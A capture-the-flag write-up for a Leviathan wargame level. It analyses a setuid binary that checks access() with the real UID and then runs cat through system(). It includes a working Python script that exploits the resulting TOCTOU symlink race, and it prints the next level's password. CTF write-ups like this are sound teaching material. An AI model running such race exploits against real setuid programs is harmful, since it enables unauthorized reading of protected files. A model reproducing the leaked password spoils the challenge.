# Setuid binary
Home directory has a setuid binary `printfile`, owned by leviathan3. It expects a file as argument, so I run it as so:
```
./printfile /etc/leviathan_pass/leviathan3
```

But then it says `You cant have that file...`, what's happening?

# Analyzing the binary
Roughly the binary does the following:
- it checks its argument (or lack thereof)
- it calls syscall access() to check it has read permission on the file passed as argument. If not, it prints out an error message and exits.
- it builds a command string by concatenating "/bin/cat" and the file passed as argument
- it calls syscall geteuid()
- it calls syscall geteuid() again
- it calls syscall setreuid()
- it calls syscall system(), passing the command string

To understand what's happening here, you have to understand the difference between real and effective UID, and how that works with setuid binaries. That link has a good explanation: https://www.baeldung.com/linux/setuid-and-user-ids. Roughly speaking, when invoking a setuid binary the real UID is set to the UID of the user who launched the process, and the effective UID is set to the UID of user owning the file.

Here, we are logged in as leviathan2 but printfile is owned by leviathan3. The effective UID is leviathan3, so how comes it cannot the file we need? Well, access() checks are done using the real UID, not the effective UID. There's actually a good reason for that, as mentioned in the manpage. In our case, the real UID is leviathan2 who has no read access to `/etc/leviathan_pass/leviathan3`.

However there is a TOCTOU vulnerability here, we can create a symlink pointing to `/etc/leviathan_pass/leviathan2` that will pass the access() check, then modifies the symlink to point to `/etc/leviathan_pass/leviathan3` just in time for printfile to call system(). We are helped in that by printfile calling geteuid() (twice) then setreuid(). Those syscalls effectively amount to nothing, but they create a small delay that makes exploitation easier.

# Triggering the vuln
We need to time things right:
- if the symlink is modified too soon, the access() check will fail
- if the symlink is modified too late, the cat command will fail to read the file

I used the following python3 script to find the right delay:
```
#! /usr/bin/python3

import os
import subprocess
import threading
import time

LINK_NAME='/tmp/toctou'


def run_command(command, result_holder):
    process = subprocess.Popen(
        command,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        text = True
    )
    stdout, stderr = process.communicate()
    result_holder['stdout'] = stdout
    result_holder['stderr'] = stderr
    result_holder['returncode'] = process.returncode


delay=0
while True:
    print('Creating the symlink...')
    if os.path.islink(LINK_NAME):
        os.unlink(LINK_NAME)
    os.symlink('/etc/leviathan_pass/leviathan2', LINK_NAME)

    print('Launching printfile...')
    command = ['./printfile', LINK_NAME]
    result = {}
    thread = threading.Thread(target=run_command, args=(command, result))
    thread.start()

    print(f'Sleeping for {delay * 1000000} microseconds...')
    time.sleep(delay)

    print('Updating the symlink...')
    if os.path.islink(LINK_NAME):
        os.unlink(LINK_NAME)
    os.symlink('/etc/leviathan_pass/leviathan3', LINK_NAME)

    print('Checking printfile output...')
    thread.join()
    output = result.get('stdout')
    if 'You cant have that file...' in output:
        print('Too fast, increasing delay...')
        delay += .000005
    elif 'Permission denied' in output: 
        print('Too slow, decreasing delay...')
        delay -= .000005
    else:
        print('Something happened...')
        print(output)
        break

    time.sleep(1)
```

Password for the next level is `f0n8h2iWLP`.

